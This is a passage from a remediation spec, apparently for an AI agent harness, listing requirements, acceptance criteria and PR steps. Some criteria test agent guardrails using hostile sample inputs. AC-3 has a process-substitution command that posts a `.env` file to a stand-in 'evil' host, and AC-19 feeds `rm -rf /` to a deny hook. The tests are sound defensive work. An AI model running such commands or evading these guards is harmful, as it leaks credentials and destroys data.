  the `sampling-parity.test.ts` pattern MUST fail when either stack's set differs
  from the policy's. `build_policy_bundle.py` MUST read `policy_id` and
  `agent_defaults.human_approval_required` from the policy it digests and fail
  closed when either is absent; its `version` is the bundle-format version and
  becomes a triaged constant.
- R-CQ-14: `test_constant_triage.TestTheInventoryIsComplete` MUST also discover
  numeric dataclass field defaults and numeric keyword defaults in source modules;
  `verification.timeout` MUST resolve from `orchestrator.api_timeout_sec`; the
  `[:200]`/`[:80]` sites in `langgraph/nodes.py` MUST reuse `TASK_LOG_PREVIEW_CHARS`
  and the `[:40]`/`[:48]` pair in `plan_rules.py` one named constant, each
  triaged; `verify_repository.py:18` MUST import `SHA256_HEX_LEN`; `meta_tools`'
  poll slack MUST join DEC-039; `VULTURE_MIN_CONFIDENCE` MUST resolve from a new
  `limits.vulture_min_confidence` key through a Python reader in the
  `coverage_gate` style; and `ruff` MUST select `PLR2004` on the source tree with
  the remaining nine sites named or triaged, so a new magic comparison is a lint
  failure rather than an audit finding.
- R-CQ-15: `/chat/completions` MUST be one named constant per stack and the
  secret-mask prefix and suffix widths MUST be named constants in both
  `nemotron_bridge.py` and `secret-masker.ts`, each pair pinned equal by a parity
  test; the `.env` discovery MUST have one documented search root shared by both
  stacks, with a read failure logged at WARNING rather than `debug`/swallowed.
- R-CQ-16: The primary CI interpreter MUST be a matrix member: `build-full`,
  `audit` and the three `scheduled-drift.yml` jobs move from `3.11` to `3.12`, and
  `test_workflow_contracts.py` MUST fail on a `python-version` that is in no
  matrix; every `setup-python` step in `scheduled-drift.yml` MUST enable the pip
  cache.

Phase 4 — anti-patterns and duplication (4 PRs; `write_policy.py`,
`harness/shared/langgraph/**` protected).

- R-CQ-17: `complete_chat` MUST be split into request resolution and a
  send-with-retry loop, `ExecutionLoop.__init__` and the facade MUST take a
  `LoopConfig` dataclass, and `ruff` MUST select `C901`, `PLR0912`, `PLR0913`,
  `PLR0915` and `PLR0911` on the source tree with the measured counts (16, 8, 4,
  2, 7) recorded in `test_deferred_rigor.py` until each is at zero, so complexity
  cannot regrow silently.
- R-CQ-18: The chat wire shape MUST be typed: `ChatMessage` and `ChatResponse`
  `TypedDict`s in `nemotron_bridge.py`, `GateStatus` and `TestResult` in
  `langgraph/state.py`, the routing functions in `graph.py` annotated
  `RunnableConfig | None` so the seven `UserWarning`s per run stop, the LangGraph
  `"pass"`/`"fail"` literals MUST come from constants in `state.py`, and the
  ImportError re-import bootstrap MUST be one `sys.path` fix-up before a single
  import so the 17 `type: ignore[no-redef]` comments it causes are deleted. On the
  Node side `eslint.config.js` MUST extend `recommendedTypeChecked`, and
  `nemotron-client.ts` MUST narrow vendor JSON to `unknown` with guards, raise a
  `NemotronHttpError` class instead of patching `Error`, and `cli.ts` MUST await
  or `.catch` its top-level promise.
- R-CQ-19: The shell byte-identity gate in `test_harness.py` MUST cover
  `run_vitest.sh` or the callerless shared copy MUST be deleted, and the "keep in
  sync manually" comment in `harness/node/scripts/run_vitest.sh:6-7` MUST cite the
  test instead; every shell script under `harness/shared/`, `.mango/hooks/` and
  `.claude/hooks/` MUST start with `set -euo pipefail`, and `block_dangerous.sh`
  MUST deny when `jq` is absent or `COMMAND` is empty on non-empty input; the
  six `python3` and one `python` interpreter references MUST resolve through one
  `${PYTHON:-python3}` variable.
- R-CQ-20: The PEP 562 deprecation shim body MUST have one implementation at the
  flat root (`harness/shared/_deprecation.py`, a `LAYERS` entry at level 0) that
  the five shim sites call with their names table; every shim MUST declare the
  `pyproject.toml` version that removes it in one constant the shim and
  `test_deprecation_shims.py` both read; the test MUST warn one minor before that
  version and fail at it; the removal version is the minor after the release NS-3
  settles. The five env-int coercers MUST become one `env_int` that warns on
  garbage; the JSON-object loaders in `broker.py`, `coverage_scope.py` and
  `write_policy.py` MUST route through `governance_json.read_json_object`.
- R-CQ-21: Duplicated test fixtures MUST have one definition, corrected from
  revision 1: `mock_workspace` (three copies plus `agent_workspace`),
  `mock_complete_chat` (two), `_resp`/`_tool_call` versus
  `chat_response`/`tool_call`, `_passing_outcome` (two), the two `api_server_key`
  fixtures, `_ensure_make_on_path` (two classes), and the control-plane
  `_load`/`test_import_has_no_side_effects` pair (parametrized once); the
  duplicate-body rule in `test_test_quality.py` MUST be scoped to top-level
  fixtures and top-level tests with at least three statements and carry a
  `DUPLICATE_BODY_WAIVERS` dict in the `ASSERTION_FREE_WAIVERS` pattern, so it
  passes on the consolidated tree and fails on a `tmp_path` suite with two
  identical fixtures. The 25 `patch("urllib.request.urlopen")` sites MUST use one
  conftest `mock_urlopen` fixture that patches through the bridge module;
  `test_validate_invariants.py:124-128` MUST use `monkeypatch`;
  `test_autonomous_healing.py:12`'s socket exemption MUST be deleted and
  `test_mcp_server.py:20`'s narrowed to the `asyncio.run` tests with the reason
  inline; `test_orchestrator_agent_loop.py:171`, the five `test_mango_mas_live.py`
  reasons and `test_import_purity.py:139-160` MUST carry `DEC-026` or lose the
  skip; `test_makefile_contracts.py:100`'s dead guard MUST go; the three bare
  `python3` spawns in `test_validate_plan.py` MUST use `sys.executable`;
  `test_harness.py`'s ten concerns MUST move to their sibling modules.
- R-CQ-22: `harness/shared/langgraph/ablation.py` MUST move under
  `harness/shared/experimental/` with a deprecation shim at the old path, its
  three test importers retargeted; `harness/node/knip.json` MUST list real entry
  points so knip can report an unreferenced source module, with `index.ts` and
  `governance/policy-anchor.ts` each documented as a public entry or deleted;
  `vitest.config.ts:11` MUST name the tests that actually pin it.

Phase 5 — CI truthfulness and cost (2 PRs; workflows, `pyproject.toml` protected).

- R-CQ-23: A check MUST NOT be required while it cannot fail on a finding: the 3.9
  `pip-audit` MUST run as a `continue-on-error` step inside the `audit` job, the
  `audit-matrix` job keeps 3.10 and 3.12, the ruleset export, `NEXT_STEPS.md` and
  the two check-name tests drop `dependency-audit (3.9)`, and
  `test_required_contexts_are_exactly_the_reported_check_names` stays an equality.
  The `secret-scan` and `audit` jobs MUST cache the Go build of gitleaks and
  osv-scanner keyed on the Go version and on `GITLEAKS_VERSION`/`OSV_VERSION`
  printed by a `make print-<VAR>` target, never a restated literal.
- R-CQ-24: Every registered pytest marker MUST have at least one user: `security`
  is removed, `liveness` is registered and applied to the gate-liveness modules,
  `deprecation_shims` is registered for R-CQ-11, `slow` is either selected by a
  target or removed, and a test fails on a `tmp_path` `pyproject.toml` registering
  a marker no collected item carries; the regression tier stays path-selected per
  `harness/CONTRACT.md`, and NS-11 is cited as the item that moves reproductions
  into it.

Phase 6 — structure and documents (3 PRs).

- R-CQ-25 (*child spec* `control-plane-package`): `harness/control-plane` MUST
  become the importable `harness/control_plane`, deleting the eight bespoke path
  loaders, the duplicate `testpaths`/coverage/Makefile plumbing and the two
  spellings in `test_constant_triage.py`, with a `harness/control-plane/` shim
  directory for one minor release; or the decision log MUST record why the hyphen
  stays and the loaders collapse to `_helpers.load_module_by_path`.
- R-CQ-26: `plan_rules.py` and `nemotron-client.ts` MUST each be split by seam
  (rule families; transport versus stream parsing) in the DEC-035 manner *before*
  R-CQ-14 and R-CQ-17 edit them, each landing below the watch threshold the
  `tech-debt-audit` skill applies (60 % of `limits.size_budget_lines`); the
  `make validate` headroom line MUST then name neither file.
- R-CQ-27: Documents MUST agree with the tree: `docs/reports/TEST-REPORT.md`,
  `docs/reports/SDLC_HYGIENE_REPORT.md`, `docs/reports/PEER-REVIEW-REMEDIATION.md`,
  `docs/SDLC_HYGIENE_AND_GAP_ANALYSIS.md` and `harness/docs/BENCHMARK_REPORT.md`
  move to `docs/reports/archive/` behind an index naming what superseded each;
  `god-file-decomposition.md` cites the policy key instead of a percentage;
  `harness/README.md` and `harness/CONTRACT.md` either join `VERSION_MIRRORS` or
  drop their version strings; `test_agent_surface_liveness.py:398-404` MUST scan
  `harness/control-plane/tests` too.
- R-CQ-28: Every spec MUST carry a `Status:` line (`PROPOSED`, `IN PROGRESS`,
  `LANDED`, `SUPERSEDED`), scaffolded by `SPEC_TEMPLATE.md`, and the line MUST
  select the tier: `LANDED`/`SUPERSEDED` specs get the structural rules plus a new
  `LANDED_OPEN_BOX` rule; `PROPOSED`/`IN PROGRESS` get the full plan tier. The rule
  MUST hold in both directions (`LANDED ⇔ zero open boxes), so the five specs in
  problem item 13 are re-ticked once and a spec cannot sit `IN PROGRESS` with
  every box closed. A spec with no `Status:` line MUST be a structural-tier finding
  only after the backfill lands.

Phase 7 — coverage and proof (rides every slice).

- R-CQ-29: The coverage gate MUST pass on every slice with floors from
  `governance-policy.json → coverage.{lines,branches,per_file}`; the baseline
  (lines 99.29 %, branches 97.81 %) is reported in each PR, never restated as a
  floor; every slice brings arc tests for the files it touches, and the four
  lowest files by lines close their shim-only arcs in the R-CQ-20 PR.
- R-CQ-30: Every one-line item MUST land in one unprotected trivia PR before
  Phase 1: `verify_repository.py:18`, `harness/README.md:1`, the
  `run_vitest.sh:6-7` comment, `god-file-decomposition.md:21,53`,
  `vitest.config.ts:11`, the `docs/SDLC_HYGIENE_AND_GAP_ANALYSIS.md` move, and
  the deletion of `test_makefile_contracts.py:100`'s dead guard and the
  duplicate `importorskip` at `harness/api_server/tests/test_main.py:7`.
- R-CQ-31: Every new gate this plan adds MUST be proved by a negative test in
  the same PR (a `tmp_path` or `pytester` probe that makes the gate fail) rather
  than by a sentence in the PR body, following `gate-mutation-proof` once R-CQ-2
  lands it.

Constraints.

- C-CQ-1: No slice MUST weaken an invariant in `harness/CONTRACT.md`, add an
  `xfail`, or add a skip without a decision-log entry; a slice that amends
  CONTRACT.md lists it under files touched and carries the attestation.
- C-CQ-2: DEC-004, DEC-020 and DEC-029 stand: no module regroup, no `.py` shim
  deletion, no `.sh` body change outside the byte-identity gate; a future move
  requires a superseding entry and an acyclicity test.
- C-CQ-3: Every slice is its own PR with the `make ci` and `make lint-cold` tails
  and the `secret-scan` and `dependency-audit` job URLs in its Validation section;
  a slice touching `protected_paths` MUST carry the table from `make attestation`
  and the `infra-reviewed` label; the stage named by each criterion is the target
  that executes the check.
- C-CQ-4: Every moved or deprecated public symbol MUST keep a shim that emits
  `DeprecationWarning` on attribute access, imports silently, and declares its
  removal version (R-CQ-20); no removal before the minor after the release NS-3
  settles.

## Acceptance criteria

Each criterion states its result on `8c81bb6` so a reviewer can tell a real
change from a vacuous pass.

- [ ] AC-1: `pytest harness/shared/tests/test_workflow_contracts.py -k bypass`
      passes against the shape the decision log records and fails on a `tmp_path`
      ruleset with the other two shapes; `git grep -n "NS-1" harness/node/.governance/decision-log.md`
      matches (today: no match) · stage: `make test-python` (R-CQ-1)
      — **Partial:** the in-tree half is done, and the `"NS-1"` grep in the line
      above now matches (DEC-044 opens `R-CQ-1 / NS-1`); the `(today: …)`
      parenthetical, per this section's preamble, states the result on `8c81bb6`
      and not on HEAD. DEC-044 records the choice (the
      second shape: no human-approval rules, the nine checks unchanged, no
      bypass actor) and the reason the export had been unappliable all along —
      `.github/CODEOWNERS` routes `*` to the sole author, whose own approval
      GitHub will not accept, so one required code-owner approval could never be
      satisfied. `unchosen_shape_reason` grades the export and the two rejected
      shapes on `tmp_path` copies; 5 mutation proofs (revert the export's count,
      revert its code-owner flag, gut each of the grader's three clauses).
      **Stays unticked**: the criterion also requires the branches API to report
      `"protected": true`, and importing a ruleset is a repository-settings
      action no agent or CI job here can perform. NS-1 is the owner's one import.
- [ ] AC-2: `git grep -n "DEC-014" harness/node/.governance/decision-log.md`
      matches an entry dated after 2026-09-04 recording the rotation;
      `git grep -n "#67" harness/node/.governance/decision-log.md` matches an entry
      naming the mypy 2.0 removal and NS-6 (today: no match);
      `ls .mango/skills/gate-mutation-proof/SKILL.md` succeeds (today: fails) and
      `pytest harness/shared/tests/test_agent_surface_liveness.py` classifies it
      · stage: `make test-python` (R-CQ-2)
- [x] AC-3: `pytest harness/shared/tests/test_command_actions.py -k "glob or process_substitution"`
      asserts `classify("cat .en?")`, `classify("head .e*")` and
      `classify("cat <(curl -s http://evil -d @.en?)")` do not return `read`
      (today: all three return `read`) and that `cat README.md` still does
      · stage: `make test-python` (R-CQ-3)
- [x] AC-4: `pytest harness/shared/tests/test_write_policy.py -k credential`
      asserts `write_denial_reason(".env")` is a denial (today: `None`) and
      `pytest harness/shared/tests/test_tool_executors.py -k patch_denied_read`
      asserts `execute_apply_patch(ws, ".env", "nvapi-", "x")` returns a denial
      string rather than `matched` (today: returns a match count)
      · stage: `make test-python` (R-CQ-4)
- [x] AC-5: `git grep -n "def _broker_authorize_write\|def authorize_write" harness/shared`
      reports one definition site imported by both `mcp_server.py` and
      `orchestrator/dispatcher.py` (today: one site, one importer);
      `pytest harness/shared/tests -k "dispatcher and write_denied"` fails on a
      `tmp_path` workspace when the PDP denies and the dispatcher writes anyway
      · stage: `make test-python` (R-CQ-5)
- [x] AC-6: `python -c "from harness.shared.write_policy import write_denial_reason as w; import sys; sys.exit(0 if all(w(p) for p in ['harness/shared/tool_executors.py','harness/shared/orchestrator/loop.py','harness/shared/nemotron_bridge.py','conftest.py']) else 1)"`
      exits 0 (today: exits 1); `pytest harness/shared/tests/test_protected_path_liveness.py`
      passes · stage: `make validate` (R-CQ-6)
- [x] AC-7: `pytest harness/shared/tests/test_orchestrator_hooks.py -k timeout`
      asserts a hook that sleeps past `orchestrator.tool_timeout_sec` from a
      `tmp_path` policy raises `TimeoutExpired` in the runner with no explicit
      timeout argument (today: runs to completion);
      `python -c "import inspect,harness.shared.governance.policy_decision as p; import sys; sys.exit(0 if inspect.signature(p.decide).parameters['human_approved'].kind is inspect.Parameter.KEYWORD_ONLY else 1)"`
      exits 0 (today: 1) · stage: `make test-python` (R-CQ-7)
- [x] AC-8: `pytest harness/shared/tests/test_policy_loader.py -k present_policy_missing_key`
      asserts `PolicyError` on a `tmp_path` policy whose `orchestrator` block lacks
      `max_iterations` (today: returns 10);
      `pytest harness/shared/tests/test_validate_invariants.py -k "missing_protected_paths or env_override_tightens_only"`
      fails closed on a policy without `protected_paths` and asserts
      `MAX_FILE_LINES=9999` cannot raise the budget;
      `pytest harness/shared/tests/test_import_purity.py` passes with
      `governance/verify_zero_skips.py` importing under a malformed `tmp_path`
      policy (today: `SystemExit` at import) · stage: `make test-python` (R-CQ-8)
      — **Result:** 6 passed / 2 passed / 233 passed on the three commands as
      written. Six mutation proofs: reverting `_Section._value`, the `limits`
      key check, the `protected_paths` key check, the `>= budget` guard, the
      `MAX_SHIM_LINES` guard and the lazy `ID_RE` each fail their tests. The
      import-purity test needed rebuilding to earn its proof: the first version
      set `_POLICY_PATH` after importing, so it passed with the fix reverted;
      it now stages a copy of the module beside a malformed policy, because a
      module-scope read has no "after import".
- [x] AC-9: `git grep -nE "uses: [^@]+@v[0-9]" .github/workflows` returns nothing
      (today: 20 lines); `pytest harness/shared/tests/test_workflow_contracts.py -k "node24 or sha_pinned"`
      passes on the tree, fails on a `tmp_path` workflow with a tag reference, and
      fails on a SHA with no version comment · stage: `make test-python` (R-CQ-9)
      — **Result:** the grep returns nothing (was 20 lines); the `-k` selector
      runs 16 passed / 32 deselected. All 20 references pinned from SHAs resolved
      by `git ls-remote --tags` against each action's own repository, taking the
      peeled `^{}` commit for annotated tags. Pinned at the majors already in
      use, not the majors Dependabot #62–#66 propose; DEC-045 records why.
      Six mutation proofs (one reference back to a tag; the version comments
      stripped; the reporter gutted; the pattern loosened on SHA length; on SHA
      case; every reference treated as `./`-local). The length mutation survived
      the first attempt — the short-SHA case carried no version comment, so the
      pattern rejected it for the comment and the loosened quantifier changed
      nothing; the case now carries a valid comment and is joined by an
      over-long and an upper-case case.
- [ ] AC-10: `pytest harness/shared/tests/test_workflow_contracts.py -k require_hashes`
      fails on a `tmp_path` lock with one requirement line not followed by a
      `--hash=` line and on an install step without `--require-hashes`, and passes
      on the tree (today: the test does not exist and the lock has 0 hash lines);
      `make lock-check` passes on the hashed lock; the `dependency-audit` job on
      the PR head is green · stage: `make ci` (R-CQ-10)
- [ ] AC-11: `pytest harness/shared/tests/test_dockerfile_contract.py` fails on a
      `tmp_path` Dockerfile missing any of `@sha256:`, `USER`, the
      `COPY … package.json` before `corepack`, or carrying `EXPOSE` or `pnpm@`, and
      passes on the tree (today: the module does not exist; `Dockerfile` has
      `EXPOSE 8080` and `pnpm@11.23.0`); `git grep -n "error::DeprecationWarning" Makefile`
      matches the `coverage-python` recipe (today: no match) and
      `pytest harness/shared/tests/test_makefile_contracts.py -k deprecation_stage`
      fails when it is removed · stage: `make ci` (R-CQ-11)
- [ ] AC-12: `python -c "import ast,sys; t=ast.parse(open('harness/shared/langgraph/policy.py').read()); sys.exit(any(isinstance(n, ast.Constant) and isinstance(n.value,(int,float)) and not isinstance(n.value,bool) for n in ast.walk(t)))"`
      exits 0 (today: exits 1, eleven literals);
      `pytest harness/shared/tests/test_policy_consistency.py -k GraphPolicy`
      passes; `pytest harness/shared/tests/test_import_direction.py` fails on a
      `tmp_path` module under `langgraph/` imported by `policy_loader`
      · stage: `make test-python` (R-CQ-12)
- [ ] AC-13: `pnpm exec vitest run tests/ai/e2e/retry-parity.test.ts` passes on
      the tree and fails when either stack's status set is reverted to its literal
      (today: the file does not exist); `pytest harness/shared/tests/test_import_purity.py`
      passes with `nemotron_bridge` reading no policy at import;
      `pytest harness/control-plane/tests/test_build_policy_bundle.py -k policy_sourced`
      fails on a `tmp_path` policy lacking `policy_id` and passes on the tree
      (today: `build_policy_bundle.py:48` is a literal) · stage: `make test-node` (R-CQ-13)
- [ ] AC-14: `pytest harness/shared/tests/test_constant_triage.py -k discovery`
      fails on a `tmp_path` module carrying an untriaged `timeout: int = 300`
      dataclass field and passes on the tree;
      `git grep -nE "\[:(200|80|40|48)\]" harness/shared/langgraph/nodes.py harness/shared/plan_rules.py`
      returns nothing (today: six lines); `python -m ruff check harness/shared harness/api_server harness/control-plane --select PLR2004`
      exits 0 (today: 9 findings) · stage: `make lint` (R-CQ-14)
- [ ] AC-15: `git grep -n "chat/completions" -- 'harness/shared/*.py' 'harness/node/src/**' ':!*/tests/*'`
      reports one Python and one TypeScript site (today: one and two);
      `pytest harness/shared/tests/test_nemotron_bridge.py -k mask_widths` and
      `pnpm exec vitest run tests/ai/e2e/mask-parity.test.ts` pass and fail when
      either width is changed alone · stage: `make test-node` (R-CQ-15)
- [ ] AC-16: `git grep -c 'python-version: "3.11"' .github/workflows` returns
      nothing (today: two files, five sites);
      `pytest harness/shared/tests/test_workflow_contracts.py -k "interpreter_in_matrix or pip_cache"`
      fails on a `tmp_path` workflow whose single-interpreter job names a version
      outside the matrix and on a `setup-python` step without `cache: pip`
      · stage: `make test-python` (R-CQ-16)
- [ ] AC-17: `python -m ruff check harness/shared harness/api_server harness/control-plane --select C901,PLR0912,PLR0913,PLR0915,PLR0911 --statistics`
      reports counts at or below those `test_deferred_rigor.py` records (today:
      16, 8, 4, 2, 7) and `pytest harness/shared/tests/test_deferred_rigor.py`
      fails when a count exceeds its record; `git grep -n "def complete_chat"`
      shows a function under 50 statements · stage: `make lint` (R-CQ-17)
- [ ] AC-18: `pytest harness/shared/tests -W error::UserWarning -k langgraph_graph`
      passes (today: seven `UserWarning`s); `git grep -c "type: ignore\[no-redef\]" harness/shared harness/control-plane`
      returns nothing (today: 17 sites); `pnpm exec eslint . --max-warnings=0`
      passes with `recommendedTypeChecked` enabled and fails on a `tmp_path`
      module with a floating promise · stage: `make lint-node` (R-CQ-18)
- [ ] AC-19: `pytest harness/shared/tests/test_harness.py -k byte_identical`
      covers `run_vitest.sh` or `ls harness/shared/run_vitest.sh` fails;
      `grep -L "set -euo pipefail" harness/shared/*.sh .mango/hooks/*.sh .claude/hooks/*.sh`
      prints nothing (today: five hooks);
      `printf '{"tool_input":{"command":"rm -rf /"}}' | PATH=/nonexistent bash .mango/hooks/block_dangerous.sh`
      emits a deny decision (today: exits 0 with no output) · stage: `make test-python` (R-CQ-19)
- [ ] AC-20: `git grep -c "def __getattr__" -- 'harness/shared/*.py' ':!*/tests/*'`
      reports one site (today: four);
      `pytest harness/shared/tests/test_deprecation_shims.py -k removal_version`
      warns on a `tmp_path` `pyproject.toml` one minor below a shim's declared
      version and fails at it; `pytest -W error::DeprecationWarning harness/shared/tests -m "not deprecation_shims"`
      passes; `git grep -n "def _coerce_int\|def _int_from_env" harness/shared`
      reports one definition · stage: `make test-python` (R-CQ-20)
- [ ] AC-21: `git grep -n "def mock_workspace\|def agent_workspace\|def _passing_outcome\|def _ensure_make_on_path" harness`
      reports one site each (today: 4, 2, 2);
      `pytest harness/shared/tests/test_test_quality.py -k duplicate_body` fails
      on a `pytester` suite with two identical top-level fixtures and passes on
      the tree; `git grep -c 'patch("urllib.request.urlopen")' harness` returns
      nothing (today: 25); `git grep -n "enable_socket" harness/shared/tests/test_autonomous_healing.py`
      returns nothing; `make verify-zero-skips-python` passes after
      `pytest -m live` runs without a key · stage: `make ci` (R-CQ-21)
- [ ] AC-22: `git grep -ln "langgraph.ablation" -- 'harness/**/*.py' ':!*/tests/*'`
      lists only the shim and files under `harness/shared/experimental/`;
      `python -W error::DeprecationWarning -c "from harness.shared.langgraph.ablation import AblationNode"`
      exits non-zero and `python -W error::DeprecationWarning -c "import harness.shared.langgraph.ablation"`
      exits 0; `pnpm exec knip` fails on a `tmp_path` copy of `harness/node` with
      an unreferenced `src/` module and passes on the tree
      · stage: `make lint-node` (R-CQ-22)
- [ ] AC-23: `python -c "import json; r=json.load(open('.github/rulesets/main.json')); print([c['context'] for x in r['rules'] if x['type']=='required_status_checks' for c in x['parameters']['required_status_checks']])"`
      omits `dependency-audit (3.9)` (today: includes it);
      `pytest harness/shared/tests/test_workflow_contracts.py -k required_contexts`
      passes as an equality; `git grep -n "actions/cache" .github/workflows/python-package.yml`
      matches under both `secrets` and `audit` with a key built from
      `make print-GITLEAKS_VERSION` · stage: `make test-python` (R-CQ-23)
- [ ] AC-24: `pytest harness/shared/tests/test_marker_liveness.py` fails on a
      `pytester` `pyproject.toml` registering a marker no item carries and passes
      on the tree with `security` removed (today: `security` has zero users);
      `pytest -m liveness --co -q harness/shared/tests | tail -1` collects the
      gate-liveness modules; `make test-regression` is unchanged
      · stage: `make test-python` (R-CQ-24)
- [ ] AC-25: Either `python -c "import harness.control_plane.verify_repository"`
      exits 0 (today: `ModuleNotFoundError`) with
      `git grep -n "load_module_by_path" harness` reporting one definition and no
      control-plane caller, or the decision log records the hyphen and
      `git grep -n "control_plane" harness/shared/tests/test_constant_triage.py`
      returns nothing · stage: `make test-python` (R-CQ-25)
- [ ] AC-26: `make validate` prints a size-budget headroom line naming neither
      `plan_rules.py` nor `nemotron-client.ts` (today: names `plan_rules.py` at 428),
      and `git log --format=%s -- harness/shared/plan_rules.py` shows the split
      commit before any R-CQ-14 commit; `pnpm exec eslint . --max-warnings=0`
      passes · stage: `make validate` (R-CQ-26)
- [ ] AC-27: `ls docs/reports/archive/README.md` succeeds and
      `ls docs/reports/TEST-REPORT.md docs/SDLC_HYGIENE_AND_GAP_ANALYSIS.md` fails
      (today: the reverse); `git grep -n "85%" docs/specs/god-file-decomposition.md`
      returns nothing (today: two lines);
      `pytest harness/shared/tests/test_documentation_truth.py -k version` fails on
      a `tmp_path` copy of `harness/README.md` with a mutated version and passes
      on the tree · stage: `make test-python` (R-CQ-27)
- [ ] AC-28: `pytest harness/shared/tests/test_plan_rules.py -k "landed_open_box or status_selects_tier"`
      fails on a `LANDED` spec with one `- [ ]` box, fails on an `IN PROGRESS`
      spec with zero open boxes, and applies only the structural rules to a
      `LANDED` spec whose criteria would fail the full tier;
      `make specs` passes on the tree with every spec carrying `Status:`;
      `test -z "$(git grep -n '^- \[ \]' docs/specs/node-policy-wiring.md)"`
      succeeds (today: seven open boxes) · stage: `make specs` (R-CQ-28)
- [ ] AC-29: `python harness/shared/coverage_gate.py` passes with floors read from
      the policy on every slice and still exits 1 on a malformed `coverage.json`;
      the PR's Validation section shows the per-file line for every touched file
      · stage: `make coverage-python` (R-CQ-29)
- [x] AC-30: `git grep -n "!= 64" harness/control-plane/verify_repository.py`
      returns nothing (today: one line); `head -1 harness/README.md` carries no
      version string (today: `v2.0`); `git grep -n "kept in sync manually" harness`
      returns nothing; `pytest harness/api_server/tests/test_main.py -q` passes
      with the duplicate `importorskip` gone · stage: `make test-python` (R-CQ-30)
- [ ] AC-31: Every criterion above that adds a gate names the `tmp_path` or
      `pytester` probe that makes it fail; `git grep -c "tmp_path\|pytester" docs/specs/code-quality-tech-debt-plan.md`
      is at least the number of new gates (16) · stage: `make specs` (R-CQ-31)
- [ ] AC-32: `git diff 487870a..HEAD -G'pytest\.(skip|importorskip|mark\.(skipif|xfail))' --name-only -- 'harness/*/tests'`
      lists only R-CQ-21's files, each change a removal or a `DEC-026` annotation;
      `make validate` passes · stage: `make validate` (C-CQ-1)
- [ ] AC-33: `ls harness/shared/{core,tooling,runtime}` fails,
      `make check-dedup` passes, `ls harness/node/scripts/*.py harness/jvm/scripts/*.py | wc -l`
      prints 20, and `pytest harness/shared/tests/test_harness.py -k byte_identical`
      passes · stage: `make check-dedup` (C-CQ-2)
- [ ] AC-34: `make validate` exits 1 on a protected-path slice without
      `ALLOW_GITHUB_CHANGES=1`, and `make attestation-check FILE=<pr-body>` passes
      on each such PR's description · stage: `make validate` (C-CQ-3)
- [ ] AC-35: `pytest -W error::DeprecationWarning harness/shared/tests harness/api_server/tests -m "not deprecation_shims"`
      passes on every slice, `pytest harness/shared/tests/test_deprecation_shims.py -k import_silently`
      passes, and every shim's declared removal version is a semver above
      `pyproject.toml`'s · stage: `make coverage-python` (C-CQ-4)

## Steps

Ordered by dependency; one PR per numbered step unless stated.

### Phase 0 (0 code)

1. Rotate the DEC-014 credential (off-tree, first); decide the ruleset shape and
   record it; disposition #62–#73; write `gate-mutation-proof/SKILL.md` (R-CQ-1,
   R-CQ-2). Protected: `**/.governance/**`, `.mango/skills/**`.
2. The trivia PR (R-CQ-30). Unprotected.

### Phase 1 (3 PRs)

3. Classifier: glob and process-substitution grading, with the three probes as
   tests (R-CQ-3). Protected: `governance/**`.
4. Write side: credential-file denial composed from `read_policy`; `apply_patch`
   read gate; one write-authorization function and one registry (R-CQ-4, R-CQ-5).
   Protected: `write_policy.py`, `read_policy.py`, `mango_mas_orchestrator.py`.
5. Protected-path additions; hook timeout and capture; keyword-only
   `human_approved`; fail-closed readers; lazy `ID_RE` (R-CQ-6, R-CQ-7, R-CQ-8).
   Protected: `governance-policy.json`, `policy-artifact.json` (regenerated),
   `validate_invariants.py`, `check_dedup.py`, `governance/**`, `policy_loader.py`.

### Phase 2 (2 PRs)

6. SHA pins taking #62–#66's majors, parser rewrite, `actions/cache` in the
   table; hashed lock across the four recipes and both install steps (R-CQ-9,
   R-CQ-10). Protected: workflows, `Makefile`.
7. Dockerfile; `docker` Dependabot ecosystem; the `-W error` stage and the
   `deprecation_shims` marker (R-CQ-11). Protected: `Makefile`, `pyproject.toml`.

### Phase 3 (3 PRs)

8. `BUILTIN_DEFAULTS`; `GraphPolicy` derived; `LAYERS` entries (R-CQ-12).
   Protected: `policy_loader.py`, `harness/shared/langgraph/**`.
9. `make spec NAME=retry-parity`, then the key, the lazy accessor, both readers,
   the parity test; the bundle builder (R-CQ-13). Protected:
   `governance-policy.json`, `policy-artifact.json`.
10. Split `plan_rules.py` first (R-CQ-26, step 16a), then discovery extension,
    triages, `PLR2004`, `limits.vulture_min_confidence`, the path and mask
    constants, the `.env` search root, the 3.12 primary leg (R-CQ-14, R-CQ-15,
    R-CQ-16). Protected: `Makefile`, workflows, `governance-policy.json`,
    `plan_rules.py`, `langgraph/nodes.py`, `governance/verification.py`.

### Phase 4 (4 PRs)

11. Split `nemotron-client.ts` first (R-CQ-26, step 16b), then `complete_chat`
    split, `LoopConfig`, complexity rules in the deferral register (R-CQ-17).
    Protected: `mango_mas_orchestrator.py`.
12. Typing: wire `TypedDict`s, `RunnableConfig`, gate constants, one bootstrap;
    Node `recommendedTypeChecked`, `unknown` narrowing, `NemotronHttpError`,
    awaited CLI (R-CQ-18). Protected: `harness/shared/langgraph/**`, root gate
    scripts.
13. Shell: byte-identity extended, `set -euo pipefail`, `block_dangerous.sh`
    fail-closed, one interpreter variable; `_deprecation.py`, removal-version
    clock, `env_int`, JSON loaders (R-CQ-19, R-CQ-20, R-CQ-29). Protected:
    `harness/shared/*.sh`, `.mango/hooks/**`, `write_policy.py`.
14. Test hygiene: fixtures, duplicate-body rule with waivers, `mock_urlopen`,
    `monkeypatch`, socket exemptions, skip reasons, `sys.executable`,
    `test_harness.py` dissolved; `ablation.py` move with three tests retargeted;
    knip entries; `vitest.config.ts` comment (R-CQ-21, R-CQ-22). Protected:
    `harness/shared/langgraph/**`, `harness/shared/tests/*ci_gate*.py` if touched.

### Phase 5 (2 PRs)

15. The 3.9 audit as a step; ruleset export, `NEXT_STEPS.md` and the check-name
    tests updated; Go caches with `print-<VAR>` targets (R-CQ-23). Protected:
    workflows, `Makefile`.
16. Markers: `security` removed, `liveness` and `deprecation_shims` registered,
    `slow` decided, the zero-user rule (R-CQ-24). Protected: `pyproject.toml`.

### Phase 6 (3 PRs)

17. `make spec NAME=control-plane-package`, then the rename or the DEC (R-CQ-25).
    Protected: `pyproject.toml`, `Makefile`, `governance-policy.json`,
    `harness/control-plane/*.py`.
18. Archive index; spec floor citation; version mirrors; the liveness scan root
    (R-CQ-27). Protected: `harness/CONTRACT.md` if de-versioned.
19. `Status:` line, tier selection, `LANDED_OPEN_BOX`, template, re-tick the five
    (R-CQ-28). Protected: `plan_rules.py`, `validate_plan.py`, `validate_specs.py`.

### Phase 7

20. Rides every step: coverage at policy floors, arc tests, the negative test per
    gate (R-CQ-29, R-CQ-31, C-CQ-1 … C-CQ-4).

Steps 10 and 11 each begin with their R-CQ-26 split as a separate commit so the
